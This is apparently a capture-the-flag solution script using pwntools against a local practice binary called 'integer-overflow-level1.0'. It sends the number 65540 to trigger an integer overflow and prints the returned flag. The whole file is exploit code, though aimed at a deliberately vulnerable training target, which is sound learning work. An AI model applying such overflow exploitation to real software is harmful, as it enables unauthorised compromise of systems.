from pwn import *
from rich import print

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './integer-overflow-level1.0'
elf = ELF(binary)
p = process(binary)

payload = b'65540'
p.sendlineafter('Give me your input\n', payload)

flag = p.recvline()
print(f"[+] flag is {flag}")